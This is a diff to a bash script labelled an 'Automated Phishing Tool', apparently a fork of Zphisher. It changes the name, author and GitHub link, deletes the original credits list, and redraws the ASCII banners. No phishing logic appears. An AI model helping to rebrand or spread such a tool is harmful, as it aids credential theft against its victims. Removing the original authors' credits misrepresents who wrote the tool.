@@ -1,22 +1,10 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   phisherLB	: 	Automated Phishing Tool
+##   Author 	: 	KASSAR AHMAD
 ##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
+##   Github 	: 	https://github.com/lbkassar
 
-##   THANKS TO :
-##   Aditya Shakya - https://github.com/adi1090x
-##   1RaY-1 - https://github.com/1RaY-1
-##   Moises Tapia - https://github.com/MoisesTapia
-##   TheLinuxChoice - https://twitter.com/linux_choice
-##   DarksecDevelopers  - https://github.com/DarksecDevelopers
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Võ Ngọc Bảo - https://github.com/vongocbao
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
-
-
-## If you Copy Then Give the credits :)
 
 
 
@@ -153,14 +141,14 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}       _     _     _                 00          00
+		${ORANGE}|       | |   (_)   | |              11          11
+		${ORANGE} _   __ | |__  _ ___| |__   ___ _ __ 00          10
+		${ORANGE}  | '_ \| '_ \| / __| '_ \ / _ \ '__|11          10101* 
+ 		${ORANGE}  | |_) | | | | \__ \ | | |  __/ |   00          10    0
+		${ORANGE}  | .__/|_| |_|_|___/_| |_|\___|_|   11010101010 11010*
+		${ORANGE}  | |                                
+		${ORANGE}  |_|                ${RED}Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
 	EOF
@@ -170,9 +158,9 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}     ░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄ ░
+		${BLUE}     ░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄ ░
+		${BLUE}     ░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ░      ${WHITE} 2.2
 	EOF
 }
 
